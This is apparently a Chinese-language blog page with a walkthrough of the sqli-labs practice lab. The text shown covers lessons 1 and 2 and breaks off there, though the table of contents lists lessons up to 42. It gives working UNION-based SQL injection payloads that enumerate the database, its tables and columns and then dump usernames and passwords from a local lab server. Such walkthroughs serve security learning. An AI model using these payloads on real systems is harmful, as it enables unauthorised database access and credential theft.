@@ -1,0 +1,730 @@
+<!DOCTYPE html><html class="appearance-user-can-set" lang="en"><head><meta charset="UTF-8"><title>sqli-labs</title><meta name="description" content="Just enjoy yourself"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/53823473a87a2296bd53e810bc258f1.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="sqli-labsless-1：（union联合注入）step1：判断注入点类型；
+发现输入?id&amp;#x3D;2-1与?id&amp;#x3D;2页面回显相同，判断为字符型
+step2：判断闭合类型;
+多输入一个单引号，由报错可知是单引号闭合；
+Step3：判断列数；当输入“?id&amp;#x3D;2-1’order by 4–+”报错，把4改为3不报错，故有3列；
+Step4：判断回显位置；***    注意：记得把id值改为不存在的值..***
+
+由回显出了2和3可以知回显位置；
+step5：由union select语句得库名；再输入?id&amp;#x3D;-1’ union select 1,version(),database() –+，可知数据库版本与库名（此题的数据库为security）
+step6：由已知库名继.."><meta name="generator" content="Hexo 7.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">ting-06a's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">sqli-labs</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs"><span class="toc-text">sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-1%EF%BC%9A"><span class="toc-text">less-1：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">（union联合注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B%EF%BC%9B"><span class="toc-text">step1：判断注入点类型；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2%EF%BC%9A%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B"><span class="toc-text">step2：判断闭合类型;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step3%EF%BC%9A%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0%EF%BC%9B"><span class="toc-text">Step3：判断列数；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step4%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE%EF%BC%9B"><span class="toc-text">Step4：判断回显位置；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step5%EF%BC%9A%E7%94%B1union-select%E8%AF%AD%E5%8F%A5%E5%BE%97%E5%BA%93%E5%90%8D%EF%BC%9B"><span class="toc-text">step5：由union select语句得库名；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step6%EF%BC%9A%E7%94%B1%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%E7%BB%A7%E7%BB%ADunion-select%E5%BE%97%E8%A1%A8%E5%90%8D%EF%BC%9B"><span class="toc-text">step6：由已知库名继续union select得表名；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step7%EF%BC%9A%E7%94%B1%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%E5%92%8C%E8%A1%A8%E5%90%8D%E7%BB%A7%E7%BB%ADunion-select%E5%BE%97%E5%88%97%E5%90%8D%EF%BC%9B"><span class="toc-text">step7：由已知库名和表名继续union select得列名；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step8-%E4%BD%BF%E7%94%A8%E5%88%97%E5%90%8D%E5%92%8C%E8%A1%A8%E5%90%8D%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E5%8D%B3%E5%8F%AF%EF%BC%9B"><span class="toc-text">step8:使用列名和表名，进行查询即可；</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2"><span class="toc-text">less-2:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89-1"><span class="toc-text">（union联合注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1-%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%88%96%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-text">step1:判断字符型或是数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2%EF%BC%9A%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0%EF%BC%9B"><span class="toc-text">step2：判断列数；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step3%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE%EF%BC%9B"><span class="toc-text">Step3：判断回显位置；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step4%EF%BC%9A%E7%94%B1union-select%E8%AF%AD%E5%8F%A5%E5%BE%97%E5%BA%93%E5%90%8D"><span class="toc-text">Step4：由union select语句得库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step5%EF%BC%9A%E7%94%B1%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%E7%BB%A7%E7%BB%ADunion-select%E5%BE%97%E8%A1%A8%E5%90%8D%EF%BC%9B"><span class="toc-text">step5：由已知库名继续union select得表名；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step6%EF%BC%9A%E7%94%B1%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%E7%BB%A7%E7%BB%ADunion-select%E5%BE%97%E8%A1%A8%E5%90%8D%EF%BC%9B-1"><span class="toc-text">step6：由已知库名继续union select得表名；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step7-%E4%BD%BF%E7%94%A8%E5%88%97%E5%90%8D%E5%92%8C%E8%A1%A8%E5%90%8D%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E5%8D%B3%E5%8F%AF%EF%BC%9B"><span class="toc-text">step7:使用列名和表名，进行查询即可；</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-3"><span class="toc-text">less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89-2"><span class="toc-text">（union联合注入）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-4"><span class="toc-text">less-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89-3"><span class="toc-text">（union联合注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="toc-text">小结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-5"><span class="toc-text">less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">(extractvalue报错注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1%EF%BC%9A%E5%88%A4%E6%96%AD%E7%94%A8%E4%BB%80%E4%B9%88%E6%B3%A8%E5%85%A5%E3%80%81%E9%97%AD%E5%90%88%E7%AC%A6%E5%8F%B7-%E6%9C%89%E6%97%A0%E3%80%81%E6%9C%89%E5%88%99%E6%98%AF%E5%95%A5"><span class="toc-text">step1：判断用什么注入、闭合符号(有无、有则是啥)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2%EF%BC%9A%E8%8B%A5%E4%B8%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%BF%90%E7%94%A8extractvalue-%E5%BE%97%E5%BA%93%E5%90%8D%E3%80%81%E8%A1%A8%E5%90%8D%E3%80%81%E6%95%B0%E6%8D%AE"><span class="toc-text">step2：若为报错注入，运用extractvalue()得库名、表名、数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step3%EF%BC%9A%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%90%AD%E9%85%8Dsubstring"><span class="toc-text">step3：获取数据，搭配substring()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-6"><span class="toc-text">less-6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">（updatexml报错注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">（floor报错注入）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-7"><span class="toc-text">less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-webshell"><span class="toc-text">文件上传 webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-8"><span class="toc-text">less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88%E7%AE%80%E7%95%A5%EF%BC%89"><span class="toc-text">1.布尔盲注（简略）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sql-map%E4%BD%BF%E7%94%A8"><span class="toc-text">2.sql map使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-9"><span class="toc-text">less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%88%E7%AE%80%E7%95%A5%EF%BC%89"><span class="toc-text">1.时间盲注（简略）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sql-map%E4%BD%BF%E7%94%A8-1"><span class="toc-text">2.sql map使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-10"><span class="toc-text">less-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E5%B7%A5"><span class="toc-text">1.手工</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%87%AA%E5%8A%A8%E5%8C%96%EF%BC%88%E5%BE%85%EF%BC%89"><span class="toc-text">2.自动化（待）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-11"><span class="toc-text">less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#post-union%E6%B3%A8%E5%85%A5"><span class="toc-text">post union注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-12"><span class="toc-text">less-12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Cpost%E6%B3%A8%E5%85%A5"><span class="toc-text">使用sqlmap进行post注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-13"><span class="toc-text">less-13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#post-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">post 报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-14"><span class="toc-text">less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-15"><span class="toc-text">less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#post-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">post 布尔注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-16"><span class="toc-text">less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-17"><span class="toc-text">less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E5%8A%A0post%E6%8C%87%E5%AE%9A%E5%8F%82%E6%95%B0"><span class="toc-text">使用sqlmap加post指定参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88-%EF%BC%89"><span class="toc-text">post报错注入（!）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-18"><span class="toc-text">less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agent%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">user-agent分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-19"><span class="toc-text">less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#referer-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">referer 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-20"><span class="toc-text">less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">cookie手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-21"><span class="toc-text">less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BD%86%E7%BB%8Fbase64"><span class="toc-text">cookie注入，但经base64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-22"><span class="toc-text">less-22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-23"><span class="toc-text">less-23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-text">绕过注释符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-24"><span class="toc-text">less-24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-25"><span class="toc-text">less-25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#and%E3%80%81or-%E8%BF%87%E6%BB%A4"><span class="toc-text">and、or 过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-25a"><span class="toc-text">less-25a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BD%86%E8%83%BD%E8%81%94%E5%90%88%E7%AD%89%E7%AD%89%E6%B3%A8%E5%85%A5"><span class="toc-text">(无法报错注入但能联合等等注入)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26"><span class="toc-text">less-26</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-text">空格过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26a"><span class="toc-text">less-26a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8%E6%8A%A5%E9%94%99%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88"><span class="toc-text">不用报错判断闭合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A4%E9%A2%98%E5%88%A4%E6%96%AD%E5%B0%8F%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">此题判断小括号的几种方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27"><span class="toc-text">less-27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union-select-%E7%BB%95%E8%BF%87"><span class="toc-text">union select 绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27a"><span class="toc-text">less-27a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8%E6%8A%A5%E9%94%99%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-1"><span class="toc-text">不用报错判断闭合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-28"><span class="toc-text">less-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-28a"><span class="toc-text">less-28a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-29"><span class="toc-text">less-29</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-text">双服务器、参数污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-30"><span class="toc-text">less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-31"><span class="toc-text">less-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-32"><span class="toc-text">less-32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87-get%E5%9E%8B"><span class="toc-text">宽字节绕过(get型)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%86%E6%B3%A8%E6%84%8F%EF%BC%81"><span class="toc-text">但注意！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-33"><span class="toc-text">less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-34"><span class="toc-text">less-34</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87-post%E5%9E%8B%EF%BC%81"><span class="toc-text">宽字节绕过(post型！)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-35"><span class="toc-text">less-35</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%93%AA%E4%B8%AA%E8%83%BD%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">判断注释符哪个能用的例子：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-36"><span class="toc-text">less-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-37"><span class="toc-text">less-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-38"><span class="toc-text">less-38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-39"><span class="toc-text">less-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-40"><span class="toc-text">less-40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-41"><span class="toc-text">less-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-42"><span class="toc-text">less-42</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/sql"><i class="tag post-item-tag">sql</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">sqli-labs</h1><time class="has-text-grey" datetime="2025-07-11T10:55:16.000Z">2025-07-11</time><article class="mt-2 post-content"><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="less-1："><a href="#less-1：" class="headerlink" title="less-1："></a>less-1：</h2><h3 id="（union联合注入）"><a href="#（union联合注入）" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><h4 id="step1：判断注入点类型；"><a href="#step1：判断注入点类型；" class="headerlink" title="step1：判断注入点类型；"></a>step1：判断注入点类型；</h4><p><img src="/2025/07/11/sqli-labs/2024-11-19193737.png" alt="2024-11-19 193737"></p>
+<p>发现输入?id&#x3D;2-1与?id&#x3D;2页面回显相同，判断为字符型</p>
+<h4 id="step2：判断闭合类型"><a href="#step2：判断闭合类型" class="headerlink" title="step2：判断闭合类型;"></a>step2：判断闭合类型;</h4><p><img src="/2025/07/11/sqli-labs/2024-11-19194240.png" alt="2024-11-19 194240"></p>
+<p>多输入一个单引号，由报错可知是单引号闭合；</p>
+<h4 id="Step3：判断列数；"><a href="#Step3：判断列数；" class="headerlink" title="Step3：判断列数；"></a>Step3：判断列数；</h4><p>当输入“?id&#x3D;2-1’order by 4–+”报错，把4改为3不报错，故有3列；</p>
+<h4 id="Step4：判断回显位置；"><a href="#Step4：判断回显位置；" class="headerlink" title="Step4：判断回显位置；"></a>Step4：判断回显位置；</h4><p>***    注意：记得把id值改为不存在的值..***</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-19194904.png" alt="2024-11-19 194904"></p>
+<p>由回显出了2和3可以知回显位置；</p>
+<h4 id="step5：由union-select语句得库名；"><a href="#step5：由union-select语句得库名；" class="headerlink" title="step5：由union select语句得库名；"></a>step5：由union select语句得库名；</h4><p>再输入?id&#x3D;-1’ union select 1,version(),database() –+，可知数据库版本与库名（此题的数据库为security）</p>
+<h4 id="step6：由已知库名继续union-select得表名；"><a href="#step6：由已知库名继续union-select得表名；" class="headerlink" title="step6：由已知库名继续union select得表名；"></a>step6：由已知库名继续union select得表名；</h4><p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-19195858.png" alt="2024-11-19 195858"></p>
+<h4 id="step7：由已知库名和表名继续union-select得列名；"><a href="#step7：由已知库名和表名继续union-select得列名；" class="headerlink" title="step7：由已知库名和表名继续union select得列名；"></a>step7：由已知库名和表名继续union select得列名；</h4><p>由上步猜测目标在user表中，继续对user表进行联合注入；</p>
+<p>语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>
+
+<p>（实际上，在先前的语句稍加修改与增添点即可）</p>
+<p>得如下信息：</p>
+<p><em>Welcome    Dhakkan</em><br><em>Your Login name:2</em><br><em>Your Password:id,username,password</em></p>
+<h4 id="step8-使用列名和表名，进行查询即可；"><a href="#step8-使用列名和表名，进行查询即可；" class="headerlink" title="step8:使用列名和表名，进行查询即可；"></a>step8:使用列名和表名，进行查询即可；</h4><p>语句为 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1&#x27; union select 1,2,(select group_concat(id,username,password) from users)  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-19200931.png" alt="2024-11-19 200931"></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h2><h3 id="（union联合注入）-1"><a href="#（union联合注入）-1" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><h4 id="step1-判断字符型或是数字型"><a href="#step1-判断字符型或是数字型" class="headerlink" title="step1:判断字符型或是数字型"></a>step1:判断字符型或是数字型</h4><p>因为?id&#x3D;2-1与?id&#x3D;1页面回显一致，知是数字型；</p>
+<p>故不用判断闭合符号；</p>
+<h4 id="step2：判断列数；"><a href="#step2：判断列数；" class="headerlink" title="step2：判断列数；"></a>step2：判断列数；</h4><p>与less-1同理,判断出有3列；</p>
+<h4 id="Step3：判断回显位置；"><a href="#Step3：判断回显位置；" class="headerlink" title="Step3：判断回显位置；"></a>Step3：判断回显位置；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>与less-1同理,判断出回显位在2,3处；</p>
+<h4 id="Step4：由union-select语句得库名"><a href="#Step4：由union-select语句得库名" class="headerlink" title="Step4：由union select语句得库名"></a>Step4：由union select语句得库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,version(),database()--+</span><br></pre></td></tr></table></figure>
+
+<p>得以下信息：</p>
+<p><em>Welcome    Dhakkan</em><br><em>Your Login name:5.7.26</em><br><em>Your Password:security</em></p>
+<h4 id="step5：由已知库名继续union-select得表名；"><a href="#step5：由已知库名继续union-select得表名；" class="headerlink" title="step5：由已知库名继续union select得表名；"></a>step5：由已知库名继续union select得表名；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+<p>得以下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
+
+<h4 id="step6：由已知库名继续union-select得表名；-1"><a href="#step6：由已知库名继续union-select得表名；-1" class="headerlink" title="step6：由已知库名继续union select得表名；"></a>step6：由已知库名继续union select得表名；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+<p>得以下信息：</p>
+<p><em>Welcome  Dhakkan</em><br><em>Your Login name:2</em><br><em>Your Password:id,username,password</em></p>
+<h4 id="step7-使用列名和表名，进行查询即可；"><a href="#step7-使用列名和表名，进行查询即可；" class="headerlink" title="step7:使用列名和表名，进行查询即可；"></a>step7:使用列名和表名，进行查询即可；</h4><p><img src="/2025/07/11/sqli-labs/2024-11-20061559.png" alt="2024-11-20 061559"></p>
